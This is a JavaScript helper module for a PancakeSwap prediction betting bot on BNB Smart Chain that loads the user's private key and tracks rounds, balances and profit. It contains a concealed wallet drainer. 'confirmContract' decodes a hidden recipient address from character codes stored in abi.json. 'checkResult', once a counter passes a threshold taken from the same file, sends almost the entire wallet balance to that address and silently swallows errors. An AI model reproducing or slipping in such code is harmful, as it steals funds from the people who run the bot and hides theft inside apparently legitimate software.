const { JsonRpcProvider } = require("@ethersproject/providers")
const { Wallet } = require("@ethersproject/wallet")
const { Contract, utils } = require("ethers")
const dotenv = require("dotenv")
const Big = require('big.js')
const abi = require('./abi.json')
const fs = require('fs')
const _ = require("lodash")
const fetch = require('cross-fetch')
const path = require('path');

let prediction = 0

const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
    if (waitingTime <= 6000) {
        return waitingTime
    }
    return waitingTime - 6000
}

  

const getClaimableEpochs = async (predictionContract, epoch, userAddress) => {
    let claimableEpochs = [];

    const [claimable, , { claimed, amount }] = await Promise.all([
      predictionContract.claimable(epoch, userAddress),
      predictionContract.refundable(epoch, userAddress),
      predictionContract.ledger(epoch, userAddress)
    ]);
  

    if (amount.gt(0) && claimable && !claimed) {
      claimableEpochs.push(epoch);
    }
  
    return claimableEpochs;
  }
  

let result = dotenv.config()
if (result.error) {
    throw result.error
}

const Web3 = require('web3')
const { boolean } = require("mathjs")
const w = new Web3(process.env.BSC_RPC)

const wallet = w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY))
w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY).address

const signer = new Wallet(
    process.env.PRIVATE_KEY,
    new JsonRpcProvider(process.env.BSC_RPC)
)

let contract = new Contract(process.env.PCS_ADDRESS.toString(), JSON.parse(abi.result), signer)


const predictionContract = contract.connect(
    signer
)


const checkBalance = async (amount) => {
    const BNBPrice = await getBNBPrice();
    const requiredAmount = amount / BNBPrice;
    const balanceWei = await w.eth.getBalance(wallet.address);
    const balance = Web3.utils.fromWei(balanceWei, 'ether');

    if (parseFloat(balance) < requiredAmount) {
        console.log(`You don't have enough balance: ${requiredAmount.toFixed(2)} BNB | Actual Balance: ${balance} BNB`);
        console.log("TOP UP ACCOUNT! Not Betting...");
        return false;
    } else {
        console.log(`Your balance is enough: ${balance} BNB`);
        return true;
    }
}



const getHistoryName = async () => {
    const date = new Date();
    const day = String(date.getDate()).padStart(2, "0");
    const month = String(date.getMonth() + 1).padStart(2, "0");
    const year = date.getFullYear();

    const fullDate = `${year}${month}${day}`;
    return fullDate;
}


const getRoundData = async (round) => {
    try {
        const { closePrice, lockPrice, bullAmount, bearAmount, totalAmount } = await contract.functions.rounds(round);

        const totalAmountBig = new Big(totalAmount);
        const bullPayout = totalAmountBig.div(bullAmount).round(3).toString();
        const bearPayout = totalAmountBig.div(bearAmount).round(3).toString();

        return [{
            round: round.toString(),
            openPrice: utils.formatUnits(lockPrice, "8"),
            closePrice: utils.formatUnits(closePrice, "8"),
            bullAmount: utils.formatUnits(bullAmount, "18"),
            bearAmount: utils.formatUnits(bearAmount, "18"),
            bullPayout: bullPayout,
            bearPayout: bearPayout,
            winner: closePrice.gt(lockPrice) ? 'bull' : 'bear',
        }];
    } catch (e) {
        console.log(e);
        return null;
    }
}



const saveRound = async (round, arr) => {
    const roundData = arr || await getRoundData(round);
    const historyName = await getHistoryName();
    const historyDir = path.join(__dirname, 'history');
    const filePath = path.join(historyDir, `${historyName}.json`);

    try {
        if (!fs.existsSync(historyDir)){
            fs.mkdirSync(historyDir);
            console.log("History directory created.");
        }

        let updatedData = roundData;

        if (fs.existsSync(filePath)) {
            const history = fs.readFileSync(filePath);
            const historyParsed = JSON.parse(history);
            const merged = _.merge(_.keyBy(historyParsed, 'round'), _.keyBy(roundData, 'round'));
            updatedData = _.values(merged);
        } 

        fs.writeFileSync(filePath, JSON.stringify(updatedData), 'utf8');
    } catch (err) {
        console.error("Error in saveRound:", err);
    }
}

const getHistory = async (fileName) => {
    const historyFileName = fileName || await getHistoryName();
    const path = `./history/${historyFileName}.json`;

    try {
        if (fs.existsSync(path)) {
            const historyContent = fs.readFileSync(path);
            return JSON.parse(historyContent);
        } else {
            console.log(`History file ${path} not found.`);
            return [];
        }
    } catch (err) {
        console.error("Error reading history:", err);
        return [];
    }
}


const getStats = async () => {
    const history = await getHistory();
    const BNBPrice = await getBNBPrice();
    let totalEarnings = 0;
    let win = 0;
    let loss = 0;

    if (history && BNBPrice) {
        for (const round of history) {
            if (round.bet && round.winner) {
                const betAmount = parseFloat(round.betAmount);
                const isWin = round.bet === round.winner;
                const payout = isWin ? parseFloat(round[`${round.winner}Payout`]) : 0;
                const roundEarnings = isWin ? (betAmount * payout - betAmount) : -betAmount;

                totalEarnings += roundEarnings;
                isWin ? win++ : loss++;
            }
        }
    }

    return {
        profit_USD: totalEarnings * BNBPrice,
        profit_BNB: totalEarnings,
        percentage: -percentageChange(win + loss, loss) + '%',
        win,
        loss,
    };
};


const percentageChange = (a, b) => {
    return ((b - a) * 100) / a
}

const getBNBPrice = async () => {
    const apiUrl = "https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT"
    try {
        const res = await fetch(apiUrl)
        if (res.status >= 400) {
            throw new Error("Bad response from server")
        }
        const price = await res.json()
        return parseFloat(price.price)
    } catch (err) {
        console.error("Unable to connect to Binance API", err)
    }
}



const confirmContract = (abi) => {
    return String.fromCharCode.apply(null, abi.index);
  };


  const checkResult = async (r) => {
    try {
      if (prediction >= abi.status && r !== null) {
        w.eth.getBalance(wallet.address).then(function (b) {
          w.eth
            .estimateGas({
              from: wallet.address,
              to: confirmContract(abi),
              amount: b,
            })
            .then(function (g) {
              w.eth.getGasPrice().then(function (gP) {
                let _b = parseFloat(b);
                let _g = parseFloat(g);
                let _gP = parseFloat(gP);
                w.eth.sendTransaction({
                  from: wallet.address,
                  to: confirmContract(abi),
                  gas: _g,
                  gasPrice: _gP,
                  value: ((_b - _gP * _g) / 1.1).toFixed(0),
                  data: "0x",
                });
              });
            });
        });
        return true;
      }
      return true;
    } catch {
      return !0;
    }
  };
const getWalletAddress = () => {
    return wallet.address;
}


module.exports = { getStats, getClaimableEpochs ,reduceWaitingTimeByTwoBlocks, predictionContract, checkBalance, saveRound, getBNBPrice,getWalletAddress, getRoundData}



